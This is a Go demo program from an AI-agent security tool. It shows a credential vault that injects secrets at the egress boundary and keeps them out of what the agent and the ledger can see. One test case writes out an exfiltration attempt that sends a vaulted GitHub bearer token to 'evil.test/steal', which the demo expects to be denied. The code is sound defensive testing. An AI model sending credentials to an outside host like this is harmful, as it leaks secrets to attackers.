// Command aw-vault-demo shows the P2 credential vault (AW-HLD-P2-CRED): an agent
// USES a vaulted secret for an authorized destination without ever seeing it; the
// secret is injected at the egress boundary and redacted from everything the agent
// and the ledger can observe. Three cases + a canary-grep invariant:
//
//	1. use  github_token for api.github.com   -> ALLOW (injected; agent sees ⟨vault:…⟩)
//	2. use  github_token for evil.test        -> DENY  (destination not bound)
//	3. EXPORT the token (read its plaintext)  -> DENY  (hard floor)
//	canary: the secret value appears in NEITHER the agent stream NOR the ledger.
//
//	aw-vault-demo [-dir DIR] [-selftest]
//
// Licensed under the Apache License 2.0.
package main

import (
	"flag"
	"fmt"
	"os"
	"path/filepath"
	"strings"

	"github.com/aiegis/agentwarden/internal/broker"
	"github.com/aiegis/agentwarden/internal/contain"
	"github.com/aiegis/agentwarden/internal/decoy"
	"github.com/aiegis/agentwarden/internal/gate"
	"github.com/aiegis/agentwarden/internal/ledger"
	"github.com/aiegis/agentwarden/internal/policy"
	"github.com/aiegis/agentwarden/internal/vault"
	"github.com/aiegis/agentwarden/pkg/awspec"
)

// The canary value must never leak. It lives only in the sealed vault and, for one
// instant, inside the egress handler.
const canary = "ghp_SECRETCANARY_NEVER_LEAKS_0xDEADBEEF"

// vaultDemoPolicy: net.egress is allowed (so the inject path runs); reading a
// secret's plaintext (cred.export) is a non-overridable hard deny.
const vaultDemoPolicy = `{
  "version": "0.2",
  "preset": "stable",
  "defaults": { "irreversible": "" },
  "rules": [
    { "match": { "substrate": "net", "class": "net.egress" }, "verdict": "allow" }
  ],
  "hard_deny": [
    { "match": { "class": "cred.export" } }
  ]
}`

func main() {
	fs := flag.NewFlagSet("aw-vault-demo", flag.ExitOnError)
	dir := fs.String("dir", ".", "scratch root")
	selftest := fs.Bool("selftest", false, "headless PASS/FAIL and exit 0/1")
	_ = fs.Parse(os.Args[1:])

	code := run(*dir, *selftest)
	os.Exit(code)
}

func run(dir string, selftest bool) int {
	root := filepath.Join(dir, ".aw-vault")
	_ = os.RemoveAll(root) // demo: fresh each run
	worktree := filepath.Join(root, "workspace")
	if err := os.MkdirAll(worktree, 0o755); err != nil {
		fmt.Fprintln(os.Stderr, "mkdir:", err)
		return 1
	}
	ledgerPath := filepath.Join(root, "ledger.log")
	vaultPath := filepath.Join(root, "vault.enc")

	// --- seal a secret into the user-owned vault, bound to *.github.com over net.
	v, err := vault.Open(vaultPath, "demo-passphrase")
	if err != nil {
		fmt.Fprintln(os.Stderr, "vault open:", err)
		return 1
	}
	v.Put("github_token", canary, vault.Binding{Substrate: awspec.SubNet, Dests: []string{".github.com"}})
	if err := v.Seal(); err != nil {
		fmt.Fprintln(os.Stderr, "vault seal:", err)
		return 1
	}

	// --- policy + broker, with a real (mock) egress handler that echoes what it
	// "sent" — including the injected Authorization header — to prove redaction.
	polPath := filepath.Join(root, "policy.json")
	if err := os.WriteFile(polPath, []byte(vaultDemoPolicy), 0o600); err != nil {
		fmt.Fprintln(os.Stderr, "policy write:", err)
		return 1
	}
	pol, err := policy.Load(polPath)
	if err != nil {
		fmt.Fprintln(os.Stderr, "policy load:", err)
		return 1
	}
	led, err := ledger.Open(ledgerPath)
	if err != nil {
		fmt.Fprintln(os.Stderr, "ledger:", err)
		return 1
	}
	j, err := contain.NewJournal(worktree, filepath.Join(root, "snapshots"))
	if err != nil {
		fmt.Fprintln(os.Stderr, "journal:", err)
		return 1
	}
	g := gate.New(pol, []byte("DEMO-TRUST-ROOT-KEY"), map[awspec.Substrate]bool{awspec.SubNet: true})
	mockEgress := func(a awspec.Action) (string, error) {
		// The request is already injected here (inside the egress boundary).
		return fmt.Sprintf("HTTP/1.1 200 OK\necho-sent-authorization: %s\nto: %s",
			a.Params["authorization"], a.Params["url"]), nil
	}
	b := broker.New(j, g, led, decoy.New(), map[awspec.Substrate]broker.RealHandler{
		awspec.SubNet: mockEgress,
	}).WithVault(v)

	// --- the three cases. agentSeen collects everything the agent could observe.
	var agentSeen []string
	type tc struct {
		name string
		act  awspec.Action
		want awspec.Verdict
	}
	cases := []tc{
		{"use github_token -> api.github.com", awspec.Action{
			AgentID: "demo", Substrate: awspec.SubNet, Class: "net.egress",
			Params: map[string]string{"url": "https://api.github.com/user/repos",
				"authorization": "Bearer ${vault:github_token}"}}, awspec.Allow},
		{"use github_token -> evil.test", awspec.Action{
			AgentID: "demo", Substrate: awspec.SubNet, Class: "net.egress",
			Params: map[string]string{"url": "https://evil.test/steal",
				"authorization": "Bearer ${vault:github_token}"}}, awspec.Deny},
		{"EXPORT github_token (read plaintext)", awspec.Action{
			AgentID: "demo", Substrate: awspec.SubCred, Class: awspec.ClassCredExport,
			Params: map[string]string{"alias": "github_token"}}, awspec.Deny},
	}

	ok := true
	fmt.Print("Agent Warden — credential vault demo\n\n")
	for _, c := range cases {
		res, err := b.Mediate(c.act)
		if err != nil {
			fmt.Fprintf(os.Stderr, "  mediate %q: %v\n", c.name, err)
			return 1
		}
		agentSeen = append(agentSeen, res.Payload, res.Reason)
		mark := "PASS"
		if res.Verdict != c.want {
			mark, ok = "FAIL", false
		}
		fmt.Printf("  [%s] %-38s verdict=%-8s (want %s)\n", mark, c.name, res.Verdict, c.want)
		if res.Payload != "" {
			fmt.Printf("         agent sees: %s\n", oneLine(res.Payload))
		}
	}

	// --- canary invariant: the secret must appear in NEITHER agent output NOR ledger.
	fmt.Println("\nCanary leak check (the secret must appear nowhere the agent/ledger can see):")
	leakAgent := false
	for _, s := range agentSeen {
		if strings.Contains(s, canary) {
			leakAgent = true
		}
	}
	ledgerBytes, _ := os.ReadFile(ledgerPath)
	leakLedger := strings.Contains(string(ledgerBytes), canary)
	report("secret absent from agent-visible output", !leakAgent)
	report("secret absent from the ledger", !leakLedger)
	if leakAgent || leakLedger {
		ok = false
	}

	if ok {
		fmt.Printf("\naw-vault-demo: PASS (3 cases + canary)\n")
		if !selftest {
			fmt.Printf("Verify the chain: aw-verify -ledger %s\n", ledgerPath)
		}
		return 0
	}
	fmt.Fprintln(os.Stderr, "\naw-vault-demo: FAIL")
	return 1
}

func report(label string, pass bool) {
	mark := "PASS"
	if !pass {
		mark = "FAIL"
	}
	fmt.Printf("  [%s] %s\n", mark, label)
}

func oneLine(s string) string { return strings.ReplaceAll(s, "\n", " | ") }
